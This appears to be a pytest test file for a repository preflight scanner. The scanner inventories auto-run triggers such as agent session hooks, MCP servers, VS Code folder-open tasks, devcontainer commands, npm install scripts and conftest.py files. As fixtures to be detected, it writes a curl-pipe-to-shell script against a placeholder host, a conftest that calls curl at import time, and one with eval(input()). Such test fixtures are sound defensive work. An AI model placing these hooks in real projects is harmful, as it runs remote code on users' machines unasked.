"""Synthetic declarations are inspected as data and never executed."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agentmetry.core.scanner import preflight


def _write(root: Path, name: str, content: object) -> Path:
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content if isinstance(content, str) else json.dumps(content), encoding="utf-8")
    return path


def test_preflight_inventories_the_documented_triggers(tmp_path):
    script = _write(tmp_path, "scripts/setup.js", "synthetic script contents")
    _write(tmp_path, ".claude/settings.json", {"hooks": {
        "SessionStart": [{"hooks": [
            {"type": "command", "command": 'node "${CLAUDE_PROJECT_DIR}/scripts/setup.js"'},
            {"type": "command", "command": "node scripts/setup.js"},
        ]}],
        "PreToolUse": [{"hooks": [{"type": "command", "command": "manual-control"}]}],
    }})
    _write(tmp_path, ".mcp.json", {"mcpServers": {
        "synthetic-private-label": {"type": "http", "url": "https://example.invalid/synthetic-private-url",
                                    "headers": {"Authorization": "synthetic-private-value"}},
    }})
    _write(tmp_path, ".cursor/mcp.json", {"mcpServers": {
        "synthetic-private-label": {"command": "node", "args": ["${workspaceFolder}/scripts/setup.js"]},
    }})
    _write(tmp_path, ".vscode/tasks.json", '''
        {
          // Folder-open tasks use JSONC.
          "tasks": [
            {"label":"synthetic-private-label","type":"process","command":"node",
             "args":["${workspaceFolder}/scripts/setup.js"],"runOptions":{"runOn":"folderOpen"},},
            {"label":"manual", "type":"shell","command":"manual-control"},
          ],
        }
    ''')
    _write(tmp_path, ".devcontainer/example/devcontainer.json", {
        "initializeCommand": ["echo", "synthetic-private-value"],
        "postCreateCommand": {"one": "echo synthetic-private-value"},
    })
    _write(tmp_path, "package.json", {"scripts": {"postinstall": "node ./scripts/setup.js", "test": "manual-control"}})
    _write(tmp_path, "packages/example/package.json", {"scripts": {"prepare": "echo synthetic-private-value"}})
    _write(tmp_path, "node_modules/dependency/package.json", {"scripts": {"postinstall": "unused"}})

    report = preflight.inspect_repository(tmp_path)
    assert report.exit_code() == 0
    assert report.manifests_read == 7
    assert {surface.trigger for surface in report.surfaces} == {
        "claude_session_start", "mcp_server", "vscode_folder_open", "devcontainer_lifecycle", "npm_install",
    }
    assert len(report.surfaces) == 9
    local = [row for row in report.surfaces if row.reference.status == "present_inspected"]
    assert len(local) == 5
    assert all(row.reference.path == "scripts/setup.js" and row.reference.size_bytes == script.stat().st_size
               and row.reference.observations == () and row.reference.content_sha256
               for row in local)
    remote = [row for row in report.surfaces if row.mechanism == "remote"]
    assert len(remote) == 1 and remote[0].reference.status == "remote_uninspected"
    assert {row.mechanism for row in report.surfaces if row.trigger == "devcontainer_lifecycle"} == {"host", "container"}
    for output in (json.dumps(report.to_json()), "\n".join(report.lines())):
        assert "synthetic-private" not in output and "manual-control" not in output
        assert "synthetic script contents" not in output


def test_preflight_separates_unknown_references_from_declared_paths(tmp_path, monkeypatch):
    monkeypatch.setattr(preflight, "MAX_FILE_BYTES", 260)
    large = _write(tmp_path, "large.js", "x" * 261)
    _write(tmp_path, "package.json", {"scripts": {
        "preinstall": "node ./missing.js", "install": "node ./large.js",
        "postinstall": "node ../private.js", "prepare": "node ${UNKNOWN_DIR}/example.js",
        "postprepare": "node example.js && echo example",
    }})
    report = preflight.inspect_repository(tmp_path)
    refs = {row.location: row.reference for row in report.surfaces}
    assert report.exit_code() == 0
    assert refs["scripts.preinstall"] == preflight.Reference("not_found")
    assert refs["scripts.install"] == preflight.Reference("oversized", "large.js", large.stat().st_size)
    assert refs["scripts.postinstall"] == preflight.Reference("outside_or_parent_path")
    assert refs["scripts.prepare"] == refs["scripts.postprepare"] == preflight.Reference("not_resolved")


def test_preflight_resolves_a_nested_package_relative_to_its_directory(tmp_path):
    _write(tmp_path, "packages/example/task.py", "synthetic")
    _write(tmp_path, "packages/example/package.json", {"scripts": {"postinstall": "python task.py"}})
    report = preflight.inspect_repository(tmp_path)
    (surface,) = report.surfaces
    assert surface.reference.path == "packages/example/task.py"


def test_preflight_jsonc_preserves_quoted_comment_and_comma_sequences():
    source = r'{"value":"https://example.invalid/,}/*quoted*/\"x", /* note */ "array":[1,],}'
    assert json.loads(preflight._jsonc(source)) == {
        "value": 'https://example.invalid/,}/*quoted*/"x', "array": [1],
    }


def test_preflight_reports_invalid_duplicate_and_oversized_manifests(tmp_path, monkeypatch):
    monkeypatch.setattr(preflight, "MAX_FILE_BYTES", 100)
    _write(tmp_path, ".claude/settings.json", '{"hooks":{},"hooks":{}}')
    _write(tmp_path, ".vscode/tasks.json", '{"tasks":[}')
    _write(tmp_path, "large/package.json", " " * 101)
    _write(tmp_path, "package.json", {"scripts": {"postinstall": "echo example"}})
    report = preflight.inspect_repository(tmp_path)
    assert report.exit_code() == 2
    assert report.to_json()["coverage"] == "partial"
    assert len(report.surfaces) == 1
    assert {x["path"]: x["reason"] for x in report.unobserved} == {
        ".claude/settings.json": "invalid_or_unsupported_manifest",
        ".vscode/tasks.json": "invalid_or_unsupported_manifest",
        "large/package.json": "manifest_size_limit",
    }


def test_preflight_skips_linked_paths_and_script_references(tmp_path):
    repo = tmp_path / "repo"
    outside = _write(tmp_path, "outside/package.json", {"scripts": {"postinstall": "outside-control"}})
    _write(repo, "package.json", {"scripts": {"postinstall": "node ./linked.js"}})
    try:
        (repo / "linked.js").symlink_to(outside)
        (repo / "outside").symlink_to(outside.parent, target_is_directory=True)
    except (NotImplementedError, OSError):
        pytest.skip("symlink creation is unavailable")
    report = preflight.inspect_repository(repo)
    assert report.exit_code() == 2
    assert report.manifests_read == 1
    assert {x["path"] for x in report.unobserved} == {"linked.js", "outside"}
    assert [row.reference.status for row in report.surfaces] == ["linked_path_skipped"]


@pytest.mark.parametrize(
    "limit, value, reason",
    [
        ("MAX_ENTRIES", 1, "repository_entry_limit_reached"),
        ("MAX_MANIFESTS", 1, "manifest_limit_reached"),
        ("MAX_TOTAL_BYTES", 1, "total_byte_limit"),
        ("MAX_SURFACES", 1, "surface_limit_reached"),
    ],
)
def test_preflight_reports_reached_limits(tmp_path, monkeypatch, limit, value, reason):
    monkeypatch.setattr(preflight, limit, value)
    content = {"scripts": {"preinstall": "echo test", "postinstall": "echo test"}}
    _write(tmp_path, "package.json", content)
    _write(tmp_path, "nested/package.json", content)
    report = preflight.inspect_repository(tmp_path)
    assert report.exit_code() == 2
    assert any(x["reason"] == reason for x in report.unobserved)


def test_preflight_inspects_a_referenced_script_and_keeps_contents_out(tmp_path):
    import hashlib

    body = "curl -s https://example.invalid/x.sh | sh\n"
    script = _write(tmp_path, "scripts/setup.sh", body)
    _write(tmp_path, "package.json", {"scripts": {"postinstall": "bash ./scripts/setup.sh"}})
    report = preflight.inspect_repository(tmp_path)
    (surface,) = report.surfaces
    ref = surface.reference
    assert ref.status == "present_inspected"
    assert ref.path == "scripts/setup.sh"
    assert ref.content_sha256 == hashlib.sha256(script.read_bytes()).hexdigest()
    assert "download_pipe_to_shell" in ref.observations
    for output in (json.dumps(report.to_json()), "\n".join(report.lines())):
        assert body not in output and "example.invalid/x.sh" not in output
        assert ref.content_sha256[:12] in output


def test_preflight_benign_referenced_script_has_no_observations(tmp_path):
    _write(tmp_path, "scripts/setup.js", "console.log('synthetic benign setup')\n")
    _write(tmp_path, "package.json", {"scripts": {"postinstall": "node ./scripts/setup.js"}})
    report = preflight.inspect_repository(tmp_path)
    (surface,) = report.surfaces
    assert surface.reference.status == "present_inspected"
    assert surface.reference.observations == ()
    assert surface.reference.content_sha256


def test_preflight_conftest_module_level_calls(tmp_path):
    _write(tmp_path, "conftest.py",
           "import subprocess\n"
           "subprocess.run(['curl', 'https://example.invalid/x'], check=False)\n"
           "\n"
           "def test_nothing():\n"
           "    assert True\n")
    report = preflight.inspect_repository(tmp_path)
    (surface,) = report.surfaces
    assert surface.trigger == "pytest_conftest" and surface.mechanism == "import_time"
    assert surface.reference.status == "present_inspected"
    assert "module_level_subprocess_call" in surface.reference.observations
    assert "module_level_network_call" not in surface.reference.observations


def test_preflight_conftest_eval_at_module_level_and_benign_conftest(tmp_path):
    _write(tmp_path, "conftest.py", "eval(input())\n")
    _write(tmp_path, "tests/conftest.py", "import pytest\n\n\ndef test_x():\n    assert True\n")
    report = preflight.inspect_repository(tmp_path)
    by_manifest = {row.manifest: row for row in report.surfaces}
    assert "module_level_eval_call" in by_manifest["conftest.py"].reference.observations
    benign = by_manifest["tests/conftest.py"]
    assert benign.reference.status == "present_inspected" and benign.reference.observations == ()


def test_preflight_cli_emits_json_and_preserves_the_existing_scanner(tmp_path, capsys):
    from agentmetry.cli import main

    _write(tmp_path, "package.json", {"scripts": {"postinstall": "echo test"}})
    assert main(["scan", "--preflight", str(tmp_path), "--json"]) == 0
    current = json.loads(capsys.readouterr().out)
    assert current["mode"] == "repository_preflight" and len(current["surfaces"]) == 1
    assert main(["scan", "pypi:pydantic-settings", "--json"]) == 0
    legacy = json.loads(capsys.readouterr().out)
    assert "mode" not in legacy and legacy["verdict"] == "no findings"
    assert main(["scan", "--preflight", str(tmp_path), "npm:example"]) == 2
